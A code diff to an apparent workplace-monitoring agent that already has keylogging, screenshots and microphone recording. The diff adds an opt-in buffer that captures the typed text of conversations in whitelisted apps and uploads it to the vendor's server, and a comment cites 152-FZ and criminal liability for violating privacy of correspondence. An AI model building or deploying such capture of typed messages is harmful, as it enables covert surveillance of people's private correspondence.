@@ -30,7 +30,7 @@ from auth import ensure_token
 from categories import CategoryResolver
 from diagnostics import collect_diagnostics
 from idle import get_idle_seconds
-from keylogger import KeystrokeAggregator
+from keylogger import KeystrokeAggregator, KeystrokeTextBuffer
 from local_buffer import LocalBuffer
 from screenshot import capture_primary_jpeg
 from updater import check_and_apply_update
@@ -358,11 +358,22 @@ def main() -> None:
     current_window: dict = {}
 
     keystroke_agg = None
+    keystroke_text = None
     if keystrokes_enabled:
         keystroke_agg = KeystrokeAggregator(get_window_fn=lambda: current_window)
+        # Опциональная запись содержимого переписки для whitelisted приложений.
+        # Требует юр-оформления (152-ФЗ, 138 УК) — по умолчанию выключено.
+        keystroke_text_enabled = os.environ.get("OM_ENABLE_KEYSTROKE_TEXT", "0") == "1"
+        whitelist_raw = os.environ.get("OM_KEYSTROKE_TEXT_APPS", "")
+        whitelist_apps = {x.strip() for x in whitelist_raw.split(",") if x.strip()}
+        if keystroke_text_enabled and whitelist_apps:
+            keystroke_text = KeystrokeTextBuffer(whitelist_apps=whitelist_apps)
+            keystroke_agg.attach_text_buffer(keystroke_text)
+            log.info("keystroke text buffer enabled for apps: %s", sorted(whitelist_apps))
         if not keystroke_agg.start():
             log.warning("keystroke aggregator не запустился — продолжаем без него")
             keystroke_agg = None
+            keystroke_text = None
 
     idle_buffer: list[dict] = []
     last_flush = time.monotonic()
@@ -480,6 +491,13 @@ def main() -> None:
                         ]
                         ks_total = sum(k["count"] for k in ks)
                         ok_ks = upload_keystroke_samples(client, agent_id, ks_payload)
+
+                # тексты переписки (если включён режим whitelist)
+                if keystroke_text is not None:
+                    texts = keystroke_text.drain()
+                    if texts:
+                        payload = {"agent_id": agent_id, "sessions": texts}
+                        send_with_buffer_json(client, f"{SERVER_URL}/keystroke_texts", payload)
 
                 # --- встреча: включаем/выключаем запись микрофона по сигналу с сервера ---
                 audio_info = ""
